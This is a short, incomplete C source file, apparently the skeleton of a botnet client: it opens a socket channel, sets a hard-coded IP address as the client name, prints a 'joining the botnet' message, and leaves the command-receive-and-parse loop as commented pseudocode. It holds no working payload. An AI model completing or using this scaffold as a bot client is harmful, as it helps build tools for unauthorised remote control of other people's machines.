#include "lib/utils.h"
#include "lib/macros.h"
#include "lib/connect.h"

int main(void) {

	char* name = "10.64.24.1"; //Get the client's username and store it in name
	int channel = init_socket();//initiate a channel given SERVER, PORT, and name;
	//Allocate stack space of size CMD_LENGTH to hold data of type char. Call the stack pointer msg
	printf("%s joining the botnet initializing scripts \n", name);

	/*
	Infinite Loop {
	  recieve(...);
	  parse(...);
	}
	*/
}
